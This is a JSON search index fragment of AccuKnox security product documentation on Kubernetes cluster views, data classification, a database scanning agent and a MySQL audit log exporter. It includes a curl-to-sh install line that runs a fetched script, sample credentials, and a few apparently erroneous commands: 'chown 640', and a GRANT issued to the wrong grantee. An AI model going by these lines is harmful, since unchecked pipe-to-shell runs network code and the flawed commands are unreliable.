row represents a cluster. You can further drill down to the Nodes or Pods View page.","title":"Cluster View"},{"location":"cluster_manager/k8s-cluster-management/#cluster-data","text":"Number of nodes:- Kubernetes runs your workload by placing containers into Pods to run on Nodes. The number shows the available nodes across the entire cluster. Number of pods:- The number shows available pods across the entire cluster. Number of Policies:- The number shows the number of active policies across the entire cluster. Alerts:- Number of alerts across the entire cluster. Location:- The zone/region in which your cluster (control plane and nodes) are located.","title":"Cluster Data"},{"location":"cluster_manager/k8s-cluster-management/#node-view","text":"Left Click on any cluster from the cluster view screen will take you to Node view.","title":"Node View"},{"location":"cluster_manager/k8s-cluster-management/#node-data","text":"Labels:- Number of available labels on specific node. Number of pods: Number of pods successfully scheduled at a specific node. Number of Policies: Number of Host polices applied to specific node. Host policies apply to all the nodes selected by their Node Selector. Alerts: Number of alerts across the specific node. Location: The zone/region in which your cluster (control plane and nodes) are located.","title":"Node Data"},{"location":"cluster_manager/k8s-cluster-management/#pod-view","text":"Left click on any node from the node view will take you to Pod view screen. This view will list all the pods in the node along with details.","title":"Pod View"},{"location":"cluster_manager/k8s-cluster-management/#pod-data","text":"Workload: Workload column is giving workload identity of the given pod. Workload is identified by the Accuknox workload identification engine. Accuknox will recommend policies based on this workload identification. Labels: Number of available labels on a specific pod. Number of containers: Available number of containers inside a pod. Number of Policies: Number of policies applied to the pod. Location: The zone/region in which your cluster (control plane and nodes) are located. Alerts: Number of alerts for the specific node.","title":"Pod Data"},{"location":"cluster_manager/k8s-cluster-management/#view-network-trafficgraph-view","text":"Network traffic view will give additional flow information between the pods. This network traffic is grouped by namespaces. This view will give much visibility to your workloads. Allowed traffic is indicated by the green lines and Restricted traffic is indicated by the red lines. When you right-click on a pod, you can see pod-related details on the right of the screen, and similarly, when you right-click on the flow line you are able to see a connection summary between two pods. You can also add policies to the connection from the connection summary window. There is an option to see the entire network traffic across your cluster. Cluster List view -> click Number of pods -> View Network Traffic This will give you network traffic for your entire cluster. Analyzing the flow information of your cluster, you can take decisions on how to secure your workloads at run-time.","title":"View network traffic/Graph view"},{"location":"data-protection/overview/","text":"Enterprise Data Challenges \u00b6 With the adoption of the cloud (private and public) enterprise data is being spread out into multiple places and stored in multiple technologies. As a result, enterprises are quickly being inundated with uncertainties of who has access to what data. To compound the matters, the aggressive postures taken by regulatory bodies such as GDPR, CCPA, HIPAA, HITRUST etc. are making it impossible to be certain about the access compliance of the data. The below diagram shows different dimensions of complexity aspects of enterprise data. GIven the complexity of data explosion, enterprises are unable to answer some fundamental questions related to their data and its security. I do not know an exhaustive list of all the ways my data is stored. I do not know which user, which process, which application has access to what data. I do not have a way to apply the same access restrictions to the same data no matter which environment it is at any point in time. I do not know which data is sensitive and which data is not sensitive. (sensitive data would be more than CC or SSN, even name, email are considered PII) I do not know all the places where data exists for a specific user, transaction or object. While the access to the data from the application layer is protected, it is unclear about the access from system level, non-application centric data (backup, data warehouse, ML data etc.) How it works? \u00b6 Discovery - In this part of the product, given a data source location (AWS, Azure, GCP, Network File System, Box, DropBox) or a Kubernates cluster, the system will identify all the data sources available - regardless of \u201cHow it is stored\u201d (RDBMS, File, non-RDBMS etc.) Classification and Labelling Label - In this part of the product, for all the discovered data, the system will try to identify the sensitive data. The system will also label the data based on different sensitivity aspects of the data under different labels. A user will be allowed to confirm, override or delete the labels. Audit and Enforcement: In this part of the product, the system will monitor the access to the discovered and labeled data sources, and report/alert any exception to the policy specified for the data. In cases where technically possible, the system will prevent the access to the data in question. In addition to the functional aspect of the product, the system will have administrative capabilities to - Collect the access to the data source location and establish the connection. Create policies that specify which data labels are allowed access to by which identities Reporting to view and set up alerting mechanisms for policy exceptions","title":"Overview"},{"location":"data-protection/overview/#enterprise-data-challenges","text":"With the adoption of the cloud (private and public) enterprise data is being spread out into multiple places and stored in multiple technologies. As a result, enterprises are quickly being inundated with uncertainties of who has access to what data. To compound the matters, the aggressive postures taken by regulatory bodies such as GDPR, CCPA, HIPAA, HITRUST etc. are making it impossible to be certain about the access compliance of the data. The below diagram shows different dimensions of complexity aspects of enterprise data. GIven the complexity of data explosion, enterprises are unable to answer some fundamental questions related to their data and its security. I do not know an exhaustive list of all the ways my data is stored. I do not know which user, which process, which application has access to what data. I do not have a way to apply the same access restrictions to the same data no matter which environment it is at any point in time. I do not know which data is sensitive and which data is not sensitive. (sensitive data would be more than CC or SSN, even name, email are considered PII) I do not know all the places where data exists for a specific user, transaction or object. While the access to the data from the application layer is protected, it is unclear about the access from system level, non-application centric data (backup, data warehouse, ML data etc.)","title":"Enterprise Data Challenges"},{"location":"data-protection/overview/#how-it-works","text":"Discovery - In this part of the product, given a data source location (AWS, Azure, GCP, Network File System, Box, DropBox) or a Kubernates cluster, the system will identify all the data sources available - regardless of \u201cHow it is stored\u201d (RDBMS, File, non-RDBMS etc.) Classification and Labelling Label - In this part of the product, for all the discovered data, the system will try to identify the sensitive data. The system will also label the data based on different sensitivity aspects of the data under different labels. A user will be allowed to confirm, override or delete the labels. Audit and Enforcement: In this part of the product, the system will monitor the access to the discovered and labeled data sources, and report/alert any exception to the policy specified for the data. In cases where technically possible, the system will prevent the access to the data in question. In addition to the functional aspect of the product, the system will have administrative capabilities to - Collect the access to the data source location and establish the connection. Create policies that specify which data labels are allowed access to by which identities Reporting to view and set up alerting mechanisms for policy exceptions","title":"How it works?"},{"location":"data-protection/types-of-solutions/","text":"The types of data solutions that Accuknox provides includes \u00b6 Data Provenance for S3 in Container mounted environments \u00b6 This allows us to track and taint sensitive data in containerized environemnts as it flows through the network. The data provenance system is able to answer questions like: Which process [e.g., app] was used to create this data object [e.g., file]? When the process ran what were the other data object it wrote? What data objects did the process read? Could any data have flowed from this data object to that data object? What is the sensitivity of a given data flow or connection between processes? Data Protection and sensitive tracking for S3 \u00b6 A simpler version of the data protection and sensitive tracking for S3 enables us to track sensitive data and build audit logs at scale for S3 based sensitive data sources. This system is simply referred to as S3 Data Protection throughout Accuknox documentation. Data Protection and Governance for OLTP - MySQL / Postgres \u00b6 This is a unified visibility based system which provides policy as code for enabling audit policies against MySQL and Postgres databases in K8s and Virtual machine environments.","title":"Types of solutions"},{"location":"data-protection/types-of-solutions/#the-types-of-data-solutions-that-accuknox-provides-includes","text":"","title":"The types of data solutions that Accuknox provides includes"},{"location":"data-protection/types-of-solutions/#data-provenance-for-s3-in-container-mounted-environments","text":"This allows us to track and taint sensitive data in containerized environemnts as it flows through the network. The data provenance system is able to answer questions like: Which process [e.g., app] was used to create this data object [e.g., file]? When the process ran what were the other data object it wrote? What data objects did the process read? Could any data have flowed from this data object to that data object? What is the sensitivity of a given data flow or connection between processes?","title":"Data Provenance for S3 in Container mounted environments"},{"location":"data-protection/types-of-solutions/#data-protection-and-sensitive-tracking-for-s3","text":"A simpler version of the data protection and sensitive tracking for S3 enables us to track sensitive data and build audit logs at scale for S3 based sensitive data sources. This system is simply referred to as S3 Data Protection throughout Accuknox documentation.","title":"Data Protection and sensitive tracking for S3"},{"location":"data-protection/types-of-solutions/#data-protection-and-governance-for-oltp-mysql-postgres","text":"This is a unified visibility based system which provides policy as code for enabling audit policies against MySQL and Postgres databases in K8s and Virtual machine environments.","title":"Data Protection and Governance for OLTP - MySQL / Postgres"},{"location":"data-protection/user-personas-use-cases/","text":"Types of user personas and use cases supported \u00b6 User personas Application user - commonly accessing with an application, using a single and shared username and password. ML Researcher - Typically accessing data and copying it into a data lake or S3 for machine learning processing. Data Lake User - Other types of data lake users. Support Personal - Users who access data purely for customer support reasons. Types of Use Cases addressed and available Audit trail & data governance \u2013 who accessed a given resource, and when. Provide compliance with known [ Available today ] Protection policies \u2013 policies that protect unauthorized access of data, or block access to specific sensitive classes of data [partial support - use with caution] Differential privacy \u2013 limit access to specific fields of data., or selectively encrypt them [roadmap item] -Data access quota policies that restrict the number of times a particular dataset is accessed., or how many rows are accessed [roadmap Item]","title":"User personas use cases"},{"location":"data-protection/user-personas-use-cases/#types-of-user-personas-and-use-cases-supported","text":"User personas Application user - commonly accessing with an application, using a single and shared username and password. ML Researcher - Typically accessing data and copying it into a data lake or S3 for machine learning processing. Data Lake User - Other types of data lake users. Support Personal - Users who access data purely for customer support reasons. Types of Use Cases addressed and available Audit trail & data governance \u2013 who accessed a given resource, and when. Provide compliance with known [ Available today ] Protection policies \u2013 policies that protect unauthorized access of data, or block access to specific sensitive classes of data [partial support - use with caution] Differential privacy \u2013 limit access to specific fields of data., or selectively encrypt them [roadmap item] -Data access quota policies that restrict the number of times a particular dataset is accessed., or how many rows are accessed [roadmap Item]","title":"Types of user personas and use cases supported"},{"location":"data-protection/data-agent/data-agent-installation/","text":"Accuknox Data Agent DB configuration \u00b6 AccuKnox Data Agent can scan more than 1 Database at a time. The database to be scanned is configured through a file located at conf/agent-db-config.yaml The following is an example of a agent-db-config.yaml: apiVersion: v1 type: agent-db-config data: workspace: 148 apiToken: databases: - version: V1 type: mysql key: asdlkm2lk3n-q23-asd-12-3 host: localhost port: 3306 user: ada_test_user password: password - version: V1 type: mysql key: asdlkm2lk3n-q23-asd-12-3 host: localhost port: 5432 user: test password: test Installation \u00b6 Unzip AccuKnox Data Agent Edit the conf/agent-db-config.yaml Add the Workspace ID Add the apiToken The app.yaml and agent-db-config.yaml files must be present inside conf/ folder. Run AccuKnox Data Agent ./ada","title":"Data agent installation"},{"location":"data-protection/data-agent/data-agent-installation/#accuknox-data-agent-db-configuration","text":"AccuKnox Data Agent can scan more than 1 Database at a time. The database to be scanned is configured through a file located at conf/agent-db-config.yaml The following is an example of a agent-db-config.yaml: apiVersion: v1 type: agent-db-config data: workspace: 148 apiToken: databases: - version: V1 type: mysql key: asdlkm2lk3n-q23-asd-12-3 host: localhost port: 3306 user: ada_test_user password: password - version: V1 type: mysql key: asdlkm2lk3n-q23-asd-12-3 host: localhost port: 5432 user: test password: test","title":"Accuknox Data Agent DB configuration"},{"location":"data-protection/data-agent/data-agent-installation/#installation","text":"Unzip AccuKnox Data Agent Edit the conf/agent-db-config.yaml Add the Workspace ID Add the apiToken The app.yaml and agent-db-config.yaml files must be present inside conf/ folder. Run AccuKnox Data Agent ./ada","title":"Installation"},{"location":"data-protection/data-agent/introduction/","text":"AccuKnox Data Agent \u00b6 Accuknox Data Agent scans for the database, tables in the database and columns in those tables and exports them to AccuKnox SaaS for data classification and labelling.","title":"Introduction"},{"location":"data-protection/data-agent/introduction/#accuknox-data-agent","text":"Accuknox Data Agent scans for the database, tables in the database and columns in those tables and exports them to AccuKnox SaaS for data classification and labelling.","title":"AccuKnox Data Agent"},{"location":"data-protection/data-agent/requirements/","text":"What is Accuknox Data Agent \u00b6 Accuknox Data Agent scans for the database, tables in the databases, columns in those tables and exports them to AccuKnox SaaS for data classification and labelling. Hardware Requirements \u00b6 RAM - 1 GB (Minumum) Storage 512 MB (Minimum) System Requirements \u00b6 AccuKnox Data Agent runs on a Linux host and can be run on Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+, Fedora and RHEL. Software Requirements \u00b6 In order to use Accuknox Data Agent, a working MySQL server 5.6+ that it can connect to is all that is required. Network Requirements \u00b6 AccuKnox Data Agent requires port number 443 to be open for egress. This port will be used to communicate with the AccuKnox Control Plane. Permissions required by Accuknox Data Agent on MySQL. \u00b6 AccuKnox Data Agent requires a MySQL user and password with read-only permission to the information_schema table. MySQL 5.6+ \u00b6 CREATE USER 'ada_user'@'<host>' IDENTIFIED BY '<password>'; GRANT SELECT ON information_schema.* TO '<host>'@'<password>'; FLUSH PRIVILEGES;","title":"Requirements"},{"location":"data-protection/data-agent/requirements/#what-is-accuknox-data-agent","text":"Accuknox Data Agent scans for the database, tables in the databases, columns in those tables and exports them to AccuKnox SaaS for data classification and labelling.","title":"What is Accuknox Data Agent"},{"location":"data-protection/data-agent/requirements/#hardware-requirements","text":"RAM - 1 GB (Minumum) Storage 512 MB (Minimum)","title":"Hardware Requirements"},{"location":"data-protection/data-agent/requirements/#system-requirements","text":"AccuKnox Data Agent runs on a Linux host and can be run on Linux based OSes such as Ubuntu 18.04+, Debian 8+, CentOS 7+, Fedora and RHEL.","title":"System Requirements"},{"location":"data-protection/data-agent/requirements/#software-requirements","text":"In order to use Accuknox Data Agent, a working MySQL server 5.6+ that it can connect to is all that is required.","title":"Software Requirements"},{"location":"data-protection/data-agent/requirements/#network-requirements","text":"AccuKnox Data Agent requires port number 443 to be open for egress. This port will be used to communicate with the AccuKnox Control Plane.","title":"Network Requirements"},{"location":"data-protection/data-agent/requirements/#permissions-required-by-accuknox-data-agent-on-mysql","text":"AccuKnox Data Agent requires a MySQL user and password with read-only permission to the information_schema table.","title":"Permissions required by Accuknox Data Agent on MySQL."},{"location":"data-protection/data-agent/requirements/#mysql-56","text":"CREATE USER 'ada_user'@'<host>' IDENTIFIED BY '<password>'; GRANT SELECT ON information_schema.* TO '<host>'@'<password>'; FLUSH PRIVILEGES;","title":"MySQL 5.6+"},{"location":"data-protection/data-protection-saas/how-to-configure-datasource/","text":"Step 1 : Onboard a Database \u00b6 The user will be able to see the onboarded Datasource in the dashboard. Let's configure Datasource \u00b6 Go to Datasource in Data Protection Manager, click on Configure Datasource . Select the Source type Database. Select the Datasource domain where the data is hosted. Enter the Datasource name and Datasource description. Select the Datasource type Percona MySQL Select the Datasource version. Click on the Save and next button to install the AccuKnox data agent deployment. Accuknox Data Agent Deployment To install the Accuknox Data Agent for MySQL, follow the steps in the installation Agents page. There is workspace ID and and key which dynamically generated. Click on the Next button to see the configured Datasource. It will automatically redirect to the Datasource Inventory where all the configured Datasource can be viewed. The Databases for a particular onboarded Datasource can be viewed when the user select a particular Datasource. The Accuknox data agent will scan the tables and columns in the given database which will map the sensitive classes and tags to their respective columns.","title":"How to Configure Datasource"},{"location":"data-protection/data-protection-saas/how-to-configure-datasource/#step-1-onboard-a-database","text":"The user will be able to see the onboarded Datasource in the dashboard.","title":"Step 1 : Onboard a Database"},{"location":"data-protection/data-protection-saas/how-to-configure-datasource/#lets-configure-datasource","text":"Go to Datasource in Data Protection Manager, click on Configure Datasource . Select the Source type Database. Select the Datasource domain where the data is hosted. Enter the Datasource name and Datasource description. Select the Datasource type Percona MySQL Select the Datasource version. Click on the Save and next button to install the AccuKnox data agent deployment. Accuknox Data Agent Deployment To install the Accuknox Data Agent for MySQL, follow the steps in the installation Agents page. There is workspace ID and and key which dynamically generated. Click on the Next button to see the configured Datasource. It will automatically redirect to the Datasource Inventory where all the configured Datasource can be viewed. The Databases for a particular onboarded Datasource can be viewed when the user select a particular Datasource. The Accuknox data agent will scan the tables and columns in the given database which will map the sensitive classes and tags to their respective columns.","title":"Let's configure Datasource"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-class/","text":"How to create a class \u00b6 The class inventory, where users can create a list of sensitive classes for sensitive datasource Click on the Sensitive Source Labels from the Data Protection. Select Class on the DSL Filter provided The present class inventory can be viewed, with class description , associated Tags Steps to create a sensitive class Click on Create Label. Select Class from the dropdown. Enter the Class Name (ex: Phone numbers, Credit cards, Email ID) Enter the Class description. Enter the Match Pattern, which is a regex pattern of a sensitive class, and here user can add multiple match patterns. Enter to exclude pattern. Add relevant tags to the class. Then click on create. Edit a sensitive class \u00b6 Click on the Sensitive Source Labels from Data Protection and come to class inventory by selecting class on DSL filter Select the class name which you want to edit, click on the edit button on extreme right Edit the class and match patterns. Click on the Save button. Delete a sensitive class \u00b6 Click on the class inventory from data protection. Select the class name which you want to delete, click on the delete button on extreme right Then open a Confirmation tab, click on the delete.","title":"How to manage a sensitive class"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-class/#how-to-create-a-class","text":"The class inventory, where users can create a list of sensitive classes for sensitive datasource Click on the Sensitive Source Labels from the Data Protection. Select Class on the DSL Filter provided The present class inventory can be viewed, with class description , associated Tags Steps to create a sensitive class Click on Create Label. Select Class from the dropdown. Enter the Class Name (ex: Phone numbers, Credit cards, Email ID) Enter the Class description. Enter the Match Pattern, which is a regex pattern of a sensitive class, and here user can add multiple match patterns. Enter to exclude pattern. Add relevant tags to the class. Then click on create.","title":"How to create a class"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-class/#edit-a-sensitive-class","text":"Click on the Sensitive Source Labels from Data Protection and come to class inventory by selecting class on DSL filter Select the class name which you want to edit, click on the edit button on extreme right Edit the class and match patterns. Click on the Save button.","title":"Edit a sensitive class"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-class/#delete-a-sensitive-class","text":"Click on the class inventory from data protection. Select the class name which you want to delete, click on the delete button on extreme right Then open a Confirmation tab, click on the delete.","title":"Delete a sensitive class"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-tag/","text":"Create tags for datasource The Tag inventory, where users can create a list of sensitive tags for sensitive datasource Click on the Sensitive Source Labels from the Data Protection. Select Tag on the DSL Filter provided Click the Create a Label and select the tag. Enter the Tag Name (ex: GDPR, HIPAA, SOX) Enter the Tag Description. Add relevant Sensitive Class. Click on Create button. Edit a Sensitive Tags \u00b6 Click on the tag inventory from the data protection. Click on the particular tag column which you want to edit, click on the edit button. Enter the new tag details and sensitive class, click on the Save button. Delete a Sensitive Tag \u00b6 Click on the tag inventory from the data protection. Click on the particular tag column which you want to delete, click on the delete button.","title":"How to manage a sensitive tag"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-tag/#edit-a-sensitive-tags","text":"Click on the tag inventory from the data protection. Click on the particular tag column which you want to edit, click on the edit button. Enter the new tag details and sensitive class, click on the Save button.","title":"Edit a Sensitive Tags"},{"location":"data-protection/data-protection-saas/how-to-manage-a-sensitive-tag/#delete-a-sensitive-tag","text":"Click on the tag inventory from the data protection. Click on the particular tag column which you want to delete, click on the delete button.","title":"Delete a Sensitive Tag"},{"location":"data-protection/data-protection-saas/how-to-manage-database-policy/","text":"How to create a database policy \u00b6 After mapping, create a policy for the particular Database. Enter the Policy name. Enter the policy Description. Click on the databases to see the tables and select the column which policy to apply. Select the actions, here we can select multiple actions. After selecting the actions, click on the Save button. By default, the policy, will be inactive mode, switch to active mode to apply policy on the datasource. More policies can be added by coming on Database Policy under Data Protection Manager. To view, the database access logs, click on the view logs button, which will redirect to the log summary page.","title":"How to manage Database policy"},{"location":"data-protection/data-protection-saas/how-to-manage-database-policy/#how-to-create-a-database-policy","text":"After mapping, create a policy for the particular Database. Enter the Policy name. Enter the policy Description. Click on the databases to see the tables and select the column which policy to apply. Select the actions, here we can select multiple actions. After selecting the actions, click on the Save button. By default, the policy, will be inactive mode, switch to active mode to apply policy on the datasource. More policies can be added by coming on Database Policy under Data Protection Manager. To view, the database access logs, click on the view logs button, which will redirect to the log summary page.","title":"How to create a database policy"},{"location":"data-protection/data-protection-saas/how-to-manage-databases/","text":"After configuring the Datasource we can see the datasource in this inventory Click on the Datasource from data protection. Accuknox provides you with a dashboard where all data sources are configured. Information about Datasources like Database Name, Data Domain, Data Type and Version. To add more Datasources, click on the Configure Datasource button on the right top corner. Click on the particular Datasource to view the Database associated with it. Click on the Database name to view the details of the Database, Tables in the database, view all Sensitive Classes and Tags associated. Click on the Tables to view and edit the sensitive classes and tags associated with the particular column in the database. Based on schema for the Database, a policy can be created from the given Database details by clicking on Create Policy button on top right corner of the screen.","title":"How to manage Databases"},{"location":"data-protection/data-protection-saas/how-to-manage-s3-buckets/","text":"To view S3 buckets which are configured \u00b6 Click on the S3 Inventory from Data protection Here we can view the S3 buckets which are configured In this S3 inventory, the dashboard consists of S3 Bucket name and labels, Cluster, Number of Alerts. Click on the particular bucket to see the Labels and Sensitive Sources If you want to configure a New Data Source, Click on the \" Configure Data Source \". How to configure S3 Buckets? \u00b6 Select the Bucket Files in Source type. Click on Save and Next. Follow the steps to install the Accuknox S3 Audit Reporter. Once the agent has been configured and is running, it'll start syncing the objects in the data bucket with the AccuKnox Platform. It will be redirected to sensitive source label page.","title":"How to Manage S3 Buckets"},{"location":"data-protection/data-protection-saas/how-to-manage-s3-buckets/#to-view-s3-buckets-which-are-configured","text":"Click on the S3 Inventory from Data protection Here we can view the S3 buckets which are configured In this S3 inventory, the dashboard consists of S3 Bucket name and labels, Cluster, Number of Alerts. Click on the particular bucket to see the Labels and Sensitive Sources If you want to configure a New Data Source, Click on the \" Configure Data Source \".","title":"To view S3 buckets which are configured"},{"location":"data-protection/data-protection-saas/how-to-manage-s3-buckets/#how-to-configure-s3-buckets","text":"Select the Bucket Files in Source type. Click on Save and Next. Follow the steps to install the Accuknox S3 Audit Reporter. Once the agent has been configured and is running, it'll start syncing the objects in the data bucket with the AccuKnox Platform. It will be redirected to sensitive source label page.","title":"How to configure S3 Buckets?"},{"location":"data-protection/data-protection-saas/how-to-manage-sensitive-source-labels/","text":"What are the Sensitive source labels? \u00b6 Sensitivity labels allow users to classify documents as confidential or highly confidential labels which, once applied, determine what users can do with that file. A user can view the details of existing labels, clusters and owner. How to configure label and source type? \u00b6 Select and enter a unique label. Select the required S3 bucket, a user can select multiple buckets at once if needed. Select the required objects text file, then click on NEXT . The user will be able to see a summary of S3 bucket objects within the S3 bucket added as sensitive source(s). The user has to click on SAVE to implement. After saving, the user will be redirected to Sensitive Source Labels screen. To see the audit logs for Bucket files, refer to the log summary page.","title":"Sensitive Source Labels"},{"location":"data-protection/data-protection-saas/how-to-manage-sensitive-source-labels/#what-are-the-sensitive-source-labels","text":"Sensitivity labels allow users to classify documents as confidential or highly confidential labels which, once applied, determine what users can do with that file. A user can view the details of existing labels, clusters and owner.","title":"What are the Sensitive source labels?"},{"location":"data-protection/data-protection-saas/how-to-manage-sensitive-source-labels/#how-to-configure-label-and-source-type","text":"Select and enter a unique label. Select the required S3 bucket, a user can select multiple buckets at once if needed. Select the required objects text file, then click on NEXT . The user will be able to see a summary of S3 bucket objects within the S3 bucket added as sensitive source(s). The user has to click on SAVE to implement. After saving, the user will be redirected to Sensitive Source Labels screen. To see the audit logs for Bucket files, refer to the log summary page.","title":"How to configure label and source type?"},{"location":"data-protection/data-protection-saas/overview/","text":"Overview \u00b6 This section helps you navigate to the topics of Data Protection. Data Protection for Databases and S3 bucket files Databases S3 Bucket files","title":"Overview"},{"location":"data-protection/data-protection-saas/overview/#overview","text":"This section helps you navigate to the topics of Data Protection. Data Protection for Databases and S3 bucket files Databases S3 Bucket files","title":"Overview"},{"location":"data-protection/mysql/components-for-installation/","text":"To install Accuknox's data protection for MySQL, you need to install the following two components. AccuKnox Data Agent - Scans for databases, tables and columns Audit Log Exporter - Exports access information to AccuKnox Control Plane","title":"Components for installation"},{"location":"data-protection/mysql/introduction/","text":"AccuKnox Data Protection for MySQL \u00b6 Accuknox Data Security Product provides unprecedented \u201cunified\u201d visibility and policy based access control to MySQL data sources regardless of whether the data source is on-prem or private cloud or public cloud.","title":"Introduction"},{"location":"data-protection/mysql/introduction/#accuknox-data-protection-for-mysql","text":"Accuknox Data Security Product provides unprecedented \u201cunified\u201d visibility and policy based access control to MySQL data sources regardless of whether the data source is on-prem or private cloud or public cloud.","title":"AccuKnox Data Protection for MySQL"},{"location":"data-protection/mysql/audit-log-exporter/installation/","text":"Audit Log Plugin Installation \u00b6 Percona MySQL Server \u00b6 Percona MySQL Server already comes with the audit log plugin, but it is not enabled by default. To enable it, login to the MySQL instance and do the following: INSTALL PLUGIN audit_log SONAME 'audit_log.so'; MySQL Community Edition \u00b6 MySQL Community Edition does not come with the audit log plugin by default. To download the audit log plugin, follow the below steps. Note: The Percona MySQL Server version in below steps should match your corresponding MySQL Server version to download the audit_log.so file. Download \u00b6 For MySQL 5.7+ wget https://www.percona.com/downloads/Percona-Server-5.7/LATEST/binary/tarball/Percona-Server-5.7.34-37-Linux.x86_64.glibc2.12.tar.gz For MySQL 8.0+ wget https://www.percona.com/downloads/Percona-Server-8.0/LATEST/binary/tarball/Percona-Server-8.0.25-15-Linux.x86_64.glibc2.12.tar.gz Extract the downloaded Percon Server tar xfz Percona-Server-<version number>-Linux.x86_64.glibc2.12.tar.gz Navigate to lib/mysql/plugin folder cd Percona-Server-<version number>-Linux.x86_64.glibc2.12/lib/mysql/plugin Find the plugin location of MYSQL community Edition show global variables like 'plugin%'; Copy audit_log.so plugin file to cp audit_log.so <MYSQL_PLUGIN_PATH> Login into your MySQL server mysql -u <user_name> -p <password> Enable the audit log plugin INSTALL PLUGIN audit_log SONAME 'audit_log.so'; Verify installation show global variables like '%audit%'; By default, all the databases, user accounts present in the MySQL instance are audited. To inculde/exclude specific databases, users to audit: SET GLOBAL audit_log_include_databases = 'userservice, ordersservice'; SET GLOBAL audit_log_include_accounts = 'user1@localhost,root@localhost'; You can also audit the access of specific commands. SET GLOBAL audit_log_include_commands= 'select,delete'; Fluentd Installation \u00b6 Install td-agent 4 #Ubuntu Focal curl -L https://toolbelt.treasuredata.com/sh/install-ubuntu-focal-td-agent4.sh | sh Launch Daemon sudo systemctl start td-agent.service sudo systemctl status td-agent.service Configuration \u00b6 Fluentd's configuration file is present at /etc/td-agent/td-agent.conf . Edit it <source> @type tail tag mysql path /var/log/mysql/audit.log* pos_file /opt/td-agent/audit/fluentd/mysql/audit.log.pos read_from_head true follow_inodes true <parse> @type none </parse> </source> <filter mysql> @type record_transformer <record> wsid <workspace_id> datasourcetype \"mysql\" datadomainid <datadomain_id> dbkey <db_key> </record> </filter> <match mysql> @type http endpoint_url https://api-dev.accuknox.com/agent-data-collector/api/v1/collect-data/dp-mysql-audit-logs http_method post <buffer> flush_mode interval flush_interval 10s </buffer> </match> In the above code snippet, /var/log/mysql/audit.log* is the path where the MySQL audit log is being read from and then pushed to the http endpoint url. User td-agent requires read permission to read the logs at /var/log/mysql/audit.log* . Otherwise, td-agent throws log unreadable error. Add 'td-agent' user to the \u2018adm\u2019 group, as the audit log file\u2019s group name is 'adm': usermod -a -G adm td-agent Check whether the 'adm' group been added to the 'td-agent' user, by running following command: id td-agent Then, sudo chown 640 /var/log/mysql/audit.log The pos files generated by fluentd will be stored at /opt/td-agent/audit/fluentd . Make sure td-agent has permission: sudo chown td-agent -R /opt/td-agent/audit/fluentd To reflect the changes made in config file, we need to restart the td-agent service: sudo service td-agent restart To check td-agent's logs sudo tail -f /var/log/td-agent/td-agent.log","title":"Installation"},{"location":"data-protection/mysql/audit-log-exporter/installation/#audit-log-plugin-installation","text":"","title":"Audit Log Plugin Installation"},{"location":"data-protection/mysql/audit-log-exporter/installation/#percona-mysql-server","text":"Percona MySQL Server already comes with the audit log plugin, but it is not enabled by default. To enable it, login to the MySQL instance and do the following: INSTALL PLUGIN audit_log SONAME 'audit_log.so';","title":"Percona MySQL Server"},{"location":"data-protection/mysql/audit-log-exporter/installation/#mysql-community-edition","text":"MySQL Community Edition does not come with the audit log plugin by default. To download the audit log plugin, follow the below steps. Note: The Percona MySQL Server version in below steps should match your corresponding MySQL Server version to download the audit_log.so file.","title":"MySQL Community Edition"},{"location":"data-protection/mysql/audit-log-exporter/installation/#download","text":"For MySQL 5.7+ wget https://www.percona.com/downloads/Percona-Server-5.7/LATEST/binary/tarball/Percona-Server-5.7.34-37-Linux.x86_64.glibc2.12.tar.gz For MySQL 8.0+ wget https://www.percona.com/downloads/Percona-Server-8.0/LATEST/binary/tarball/Percona-Server-8.0.25-15-Linux.x86_64.glibc2.12.tar.gz Extract the downloaded Percon Server tar xfz Percona-Server-<version number>-Linux.x86_64.glibc2.12.tar.gz Navigate to lib/mysql/plugin folder cd Percona-Server-<version number>-Linux.x86_64.glibc2.12/lib/mysql/plugin Find the plugin location of MYSQL community Edition show global variables like 'plugin%'; Copy audit_log.so plugin file to cp audit_log.so <MYSQL_PLUGIN_PATH> Login into your MySQL server mysql -u <user_name> -p <password> Enable the audit log plugin INSTALL PLUGIN audit_log SONAME 'audit_log.so'; Verify installation show global variables like '%audit%'; By default, all the databases, user accounts present in the MySQL instance are audited. To inculde/exclude specific databases, users to audit: SET GLOBAL audit_log_include_databases = 'userservice, ordersservice'; SET GLOBAL audit_log_include_accounts = 'user1@localhost,root@localhost'; You can also audit the access of specific commands. SET GLOBAL audit_log_include_commands= 'select,delete';","title":"Download"},{"location":"data-protection/mysql/audit-log-exporter/installation/#fluentd-installation","text":"Install td-agent 4 #Ubuntu Focal curl -L https://toolbelt.treasuredata.com/sh/install-ubuntu-focal-td-agent4.sh | sh Launch Daemon sudo systemctl start td-agent.service sudo systemctl status td-agent.service","title":"Fluentd Installation"},{"location":"data-protection/mysql/audit-log-exporter/installation/#configuration","text":"Fluentd's configuration file is present at /etc/td-agent/td-agent.conf . Edit it <source> @type tail tag mysql path /var/log/mysql/audit.log* pos_file /opt/td-agent/audit/fluentd/mysql/audit.log.pos read_from_head true follow_inodes true <parse> @type none </parse> </source> <filter mysql> @type record_transformer <record> wsid <workspace_id> datasourcetype \"mysql\" datadomainid <datadomain_id> dbkey <db_key> </record> </filter> <match mysql> @type http endpoint_url https://api-dev.accuknox.com/agent-data-collector/api/v1/collect-data/dp-mysql-audit-logs http_method post <buffer> flush_mode interval flush_interval 10s </buffer> </match> In the above code snippet, /var/log/mysql/audit.log* is the path where the MySQL audit log is being read from and then pushed to the http endpoint url. User td-agent requires read permission to read the logs at /var/log/mysql/audit.log* . Otherwise, td-agent throws log unreadable error. Add 'td-agent' user to the \u2018adm\u2019 group, as the audit log file\u2019s group name is 'adm': usermod -a -G adm td-agent Check whether the 'adm' group been added to the 'td-agent' user, by running following command: id td-agent Then, sudo chown 640 /var/log/mysql/audit.log The pos files generated by fluentd will be stored at /opt/td-agent/audit/fluentd . Make sure td-agent has permission: sudo chown td-agent -R /opt/td-agent/audit/fluentd To reflect the changes made in config file, we need to restart the td-agent service: sudo service td-agent restart To check td-agent's logs sudo tail -f /var/log/td-agent/td-agent.log","title":"Configuration"},{"location":"data-protection/mysql/audit-log-exporter/introduction/","text":"Audit Log Exporter \u00b6 The Audit Log 